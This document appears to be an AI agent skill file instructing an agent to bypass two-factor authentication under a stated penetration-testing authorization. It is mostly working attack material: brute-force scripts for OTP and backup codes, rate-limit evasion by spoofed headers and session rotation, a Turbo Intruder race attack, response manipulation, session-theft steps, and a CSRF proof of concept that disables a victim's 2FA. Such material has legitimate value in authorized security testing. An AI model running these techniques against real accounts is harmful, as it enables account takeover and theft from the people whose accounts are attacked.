---
name: 2fa-bypass
description: >
  Bypass two-factor authentication (2FA/MFA) during authorized penetration
  testing.
keywords:
  - 2fa bypass
  - mfa bypass
  - two-factor bypass
  - otp bypass
  - otp brute force
  - 2fa brute force
  - totp bypass
  - sms bypass
  - backup code brute force
  - 2fa response manipulation
  - skip 2fa
  - bypass mfa
  - second factor bypass
  - authentication bypass 2fa
  - the user has found an application with 2FA and wants to test for bypass techniques
tools:
  - burpsuite (Turbo Intruder)
  - curl
  - python scripts
opsec: medium
---

# 2FA / MFA Bypass

You are helping a penetration tester bypass two-factor authentication. The
target application requires a second factor (SMS code, TOTP, email code, or
backup code) after password authentication. The goal is to access accounts
without providing a valid second factor. All testing is under explicit written
authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[2fa-bypass] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Web Interaction

2FA bypass testing involves multi-step form progression — **browser tools
handle the login → 2FA flow naturally**.

- **`browser_fill`** / **`browser_click`** for login form → 2FA code entry
  progression (username/password first, then 2FA code field)
- **`browser_cookies`** for session state inspection between authentication
  stages (pre-2FA vs post-2FA cookies)
- **`browser_evaluate`** to inspect client-side validation logic (e.g.,
  `document.querySelector('form').onsubmit` to check for client-side OTP
  validation that can be bypassed)
- **curl** for response manipulation, direct navigation bypass attempts, and
  brute-force scripting

## Prerequisites

- Valid credentials (username + password) for the target account
- The account has 2FA enabled (SMS, TOTP, email OTP, or backup codes)
- Burp Suite (to intercept and modify responses)
- Knowledge of the 2FA method and code format (4-digit, 6-digit, etc.)

## Step 1: Assess

Identify the 2FA implementation details.

### Map the 2FA Flow

1. Log in with valid credentials
2. Observe the 2FA prompt — what type of code is requested?
3. Note the endpoint: `/verify-2fa`, `/mfa/verify`, `/otp/check`
4. Submit a valid code and capture the request/response
5. Submit an invalid code and compare

### Key Questions

- What is the code format? (4-digit, 6-digit, alphanumeric)
- Is there a rate limit on attempts?
- Does the code expire? How quickly?
- Can you request a new code? Does this invalidate the old one?
- Is there a "remember this device" option?
- Are backup codes available? What format?
- Are there alternative auth methods (OAuth, SSO, API)?

## Step 2: Response Manipulation

Test if 2FA validation is only enforced client-side.

### Status Code Change

Intercept the 2FA verification response in Burp:

```http
# Failed 2FA response
HTTP/1.1 403 Forbidden
{"success": false, "error": "Invalid code"}

# Modify to:
HTTP/1.1 200 OK
{"success": true}
```

If the application redirects to the dashboard → 2FA is client-side only.

### Response Body Manipulation

```json
// Original (failed)
{"authenticated": false, "mfa_verified": false}

// Modified
{"authenticated": true, "mfa_verified": true}
```

### Redirect Manipulation

```http
# Failed response redirects back to 2FA page
HTTP/1.1 302 Found
Location: /2fa/verify?error=invalid

# Modify redirect to authenticated page
HTTP/1.1 302 Found
Location: /dashboard
```

### OTP in Response

Check if the OTP appears in the response body, headers, or JavaScript:

```bash
# Check response for OTP hints
curl -s -X POST "https://TARGET/send-otp" \
  -H "Cookie: session=VALID_SESSION" \
  -d "method=sms" | grep -iE "otp|code|token|verify"

# Check JavaScript files for hardcoded codes
curl -s "https://TARGET/static/app.js" | grep -iE "otp|code.*=.*[0-9]"
```

## Step 3: Direct Navigation Bypass

Skip the 2FA page entirely by navigating directly to authenticated pages.

### Force Browse

After entering valid credentials (before completing 2FA):

```bash
# Try accessing authenticated endpoints directly
curl -s -H "Cookie: session=POST_LOGIN_SESSION" \
  "https://TARGET/dashboard"
curl -s -H "Cookie: session=POST_LOGIN_SESSION" \
  "https://TARGET/api/user/profile"
curl -s -H "Cookie: session=POST_LOGIN_SESSION" \
  "https://TARGET/account/settings"
```

If any return authenticated content → 2FA is not enforced on that endpoint.

### API Version Bypass

```bash
# Web enforces 2FA, but older API versions might not
curl -s -H "Cookie: session=POST_LOGIN_SESSION" \
  "https://TARGET/api/v1/user/profile"
curl -s -H "Cookie: session=POST_LOGIN_SESSION" \
  "https://TARGET/api/v2/user/profile"

# Mobile API endpoints
curl -s -H "Cookie: session=POST_LOGIN_SESSION" \
  "https://TARGET/mobile/api/user/profile"
```

### Subdomain Bypass

```bash
# Different subdomains may not enforce 2FA
curl -s -H "Cookie: session=POST_LOGIN_SESSION" \
  "https://api.TARGET/user/profile"
curl -s -H "Cookie: session=POST_LOGIN_SESSION" \
  "https://old.TARGET/dashboard"
```

## Step 4: Null/Empty Code Bypass

Submit null, empty, or special values as the OTP.

### Null and Empty Values

```bash
# Empty code
curl -s -X POST -H "Cookie: session=SESSION" \
  -d "code=" "https://TARGET/verify-2fa"

# Null in JSON
curl -s -X POST -H "Cookie: session=SESSION" \
  -H "Content-Type: application/json" \
  -d '{"code": null}' "https://TARGET/verify-2fa"

# Zero
curl -s -X POST -H "Cookie: session=SESSION" \
  -d "code=000000" "https://TARGET/verify-2fa"

# Boolean true
curl -s -X POST -H "Cookie: session=SESSION" \
  -H "Content-Type: application/json" \
  -d '{"code": true}' "https://TARGET/verify-2fa"
```

### Array Injection

```json
{"code": ["000000", "111111", "222222", "333333"]}
```

Some backends iterate through the array and accept if any value matches.

### Parameter Name Variation

```bash
# Try different parameter names
-d "otp=000000"
-d "one_time_code=000000"
-d "mfa_code=000000"
-d "verification_code=000000"
-d "token=000000"
```

## Step 5: OTP Brute-Force

If the OTP is short and rate limiting is weak, brute-force it.

### 6-Digit Code (1,000,000 combinations)

```python
import requests

url = "https://TARGET/verify-2fa"
cookies = {"session": "POST_LOGIN_SESSION"}

for code in range(1000000):
    r = requests.post(url, cookies=cookies,
                      data={"code": f"{code:06d}"})
    if r.status_code == 200 and "dashboard" in r.text:
        print(f"[+] Valid OTP: {code:06d}")
        break
    if code % 1000 == 0:
        print(f"[*] Tried {code}...")
```

### 4-Digit Code (10,000 combinations)

```bash
ffuf -u "https://TARGET/verify-2fa" \
  -X POST \
  -H "Cookie: session=POST_LOGIN_SESSION" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "code=FUZZ" \
  -w <(seq -w 0000 9999) \
  -mc 200,302 \
  -rate 50
```

### Rate Limit Bypass Techniques

**IP rotation via headers:**
```python
import random

headers = {
    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
}
# Also try: X-Originating-IP, X-Remote-IP, X-Client-IP, X-Real-IP
```

**Session rotation (rate limit per session):**
```python
# If rate limit is tracked per session, not per user:
# Every N attempts, get a new session
if attempt % 20 == 0:
    # Logout
    requests.get(f"{base}/logout", cookies=cookies)
    # Re-login
    r = requests.post(f"{base}/login",
                      data={"user": username, "pass": password})
    cookies = r.cookies
    # Request new OTP
    requests.post(f"{base}/send-otp", cookies=cookies)
```

**Code resend resets counter:**
```python
# Some apps reset the attempt counter when you request a new code
if attempt % 10 == 0:
    requests.post(f"{base}/resend-otp", cookies=cookies)
    # Counter reset — continue brute-force
```

**HTTP/2 single-packet attack:**
```python
# Turbo Intruder — send many attempts in one TCP packet
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)
    for code in range(1000000):
        engine.queue(target.req, f"{code:06d}", gate='race1')
        if code % 100 == 99:
            engine.openGate('race1')
            engine.complete(timeout=10)
```

## Step 6: Backup Code Attacks

### Brute-Force Backup Codes

Backup codes are typically 8-digit numeric or short alphanumeric strings
with no rate limiting separate from OTP.

```bash
# 8-digit numeric backup codes
ffuf -u "https://TARGET/verify-backup" \
  -X POST \
  -H "Cookie: session=POST_LOGIN_SESSION" \
  -d "backup_code=FUZZ" \
  -w <(seq -w 00000000 99999999) \
  -mc 200,302 \
  -rate 100
```

### Backup Code Reuse

```bash
# Use a valid backup code
curl -s -X POST -H "Cookie: session=SESSION" \
  -d "backup_code=12345678" "https://TARGET/verify-backup"
# Success

# Try the same code again — should be invalidated
curl -s -X POST -H "Cookie: session=SESSION" \
  -d "backup_code=12345678" "https://TARGET/verify-backup"
# If still accepted → codes are reusable
```

### Backup Code Leakage

Check if backup codes are exposed:
- In the response body when 2FA is first enabled
- In account settings pages (visible to XSS)
- Via API endpoints without additional auth
- In email notifications

## Step 7: Session and State Attacks

### Session Fixation After 2FA

```bash
# Complete 2FA with attacker's account, capture session cookie
# Force victim to use attacker's post-2FA session

# Or: if session token is set before 2FA and not rotated after:
# 1. Intercept victim's pre-2FA session
# 2. Complete 2FA on attacker's account with that session
# 3. Session now has 2FA-verified status for attacker's auth
```

### Remember Me / Trusted Device Token

```bash
# Capture the "remember this device" cookie/token
# Check if it's predictable, reusable, or transferable

# Check cookie attributes
curl -sI "https://TARGET/verify-2fa" \
  -H "Cookie: session=SESSION" \
  -d "code=123456&remember=true" | grep -i "set-cookie"

# Try using the device cookie without 2FA
curl -s -H "Cookie: session=SESSION; device_token=STOLEN_TOKEN" \
  "https://TARGET/dashboard"
```

### Sessions Not Invalidated on 2FA Enable

```bash
# Scenario: attacker has stolen a session cookie (pre-2FA setup)
# Victim enables 2FA on their account
# Test: does the old session still work?

curl -s -H "Cookie: session=OLD_STOLEN_SESSION" \
  "https://TARGET/dashboard"
# If 200 OK → old sessions survive 2FA enablement
```

## Step 8: Alternative Authentication Paths

### Password Reset Bypasses 2FA

```bash
# Reset password via email
# After setting new password, does login require 2FA?
# Some apps disable 2FA after password reset

# Route to password-reset-poisoning if reset flow is exploitable
```

### OAuth/SSO Bypass

```bash
# Direct login requires 2FA, but OAuth login may not
# Try: "Login with Google" → access account without 2FA prompt

# ROPC grant (Resource Owner Password Credentials) bypasses 2FA entirely
curl -s -X POST "https://IDP/token" \
  -d "grant_type=password&username=USER&password=PASS&client_id=APP"
# If token returned → 2FA bypassed

# Route to oauth-attacks for OAuth-specific bypasses
```

### CSRF on 2FA Disable

```bash
# Check if the disable endpoint has CSRF protection
curl -s -X POST -H "Cookie: session=VICTIM_SESSION" \
  "https://TARGET/account/2fa/disable"
# If no CSRF token required → attacker can disable victim's 2FA
```

Build a CSRF PoC to disable 2FA:

```html
<form method="POST" action="https://TARGET/account/2fa/disable">
  <input type="hidden" name="confirm" value="true" />
</form>
<script>document.forms[0].submit();</script>
```

Escalate for CSRF-specific techniques if a token is present.

## Step 9: Race Conditions

### TOCTOU in 2FA Verification

Send multiple verification requests simultaneously — the server may
validate the code before incrementing the failure counter:

```python
import threading
import requests

url = "https://TARGET/verify-2fa"
cookies = {"session": "POST_LOGIN_SESSION"}
results = []

def try_code(code):
    r = requests.post(url, cookies=cookies, data={"code": f"{code:06d}"})
    if "dashboard" in r.text or r.status_code == 302:
        results.append(code)

# Send 100 attempts simultaneously
threads = []
for code in range(100):
    t = threading.Thread(target=try_code, args=(code,))
    threads.append(t)
for t in threads: t.start()
for t in threads: t.join()

if results:
    print(f"[+] Valid code found: {results}")
```

### Email Change + Verification Race

If the app sends a 2FA code to the user's email:

1. Trigger 2FA code send (goes to victim's email)
2. Simultaneously change account email to attacker's
3. Race condition: code may be sent to attacker's new email instead

## Step 10: Escalate or Pivot

STOP and return to the orchestrator with:
- What was achieved (RCE, creds, file read, etc.)
- New credentials, access, or pivot paths discovered
- Context for next steps (platform, access method, working payloads)

## OPSEC Notes

- Response manipulation is invisible server-side (only modifies what the
  client receives)
- Direct navigation attempts may be logged as unauthorized access attempts
- OTP brute-force generates many failed attempts — triggers account lockout
  on most modern applications
- Rate limit bypass via header manipulation may be detectable by WAF
- CSRF on 2FA disable requires victim interaction
- OAuth ROPC attempts are logged at the token endpoint

## Troubleshooting

### Rate Limiting Blocks Brute-Force Immediately

- Try IP rotation headers (X-Forwarded-For, X-Client-IP)
- Rotate sessions (logout → re-login → new session)
- Request new code (may reset attempt counter)
- Try HTTP/2 multiplexing (Turbo Intruder)
- Slow down to 1 request/second
- Try different endpoints (/api/v1/ vs /api/v2/)

### Account Locks After Failed Attempts

- Check if lockout is temporary (wait for reset window)
- Check if lockout is per-session vs per-account
- Try a different 2FA method (backup codes vs SMS vs TOTP)
- Focus on non-brute-force techniques (response manipulation,
  direct navigation, OAuth bypass)

### Response Manipulation Doesn't Work

- Server-side validation is correct — this defense is working
- Focus on: brute-force with rate limit bypass, session attacks,
  OAuth bypass, password reset chain, CSRF on 2FA disable

### No Alternative Auth Methods Available

- Check for OAuth/SSO login buttons (even hidden ones in source)
- Check for mobile API endpoints
- Check for older API versions
- Check if password reset disables 2FA
- Focus on OTP brute-force with rate limit bypass

### TOTP (Authenticator App) Can't Be Brute-Forced in Time

- TOTP codes change every 30 seconds — brute-force is impractical
  unless the server accepts a wide time window
- Check if the server accepts multiple time steps (±1 or ±2)
- Focus on: response manipulation, direct navigation, session attacks,
  backup code brute-force (static codes)
- Check if TOTP secret is exposed (account export, backup, API)
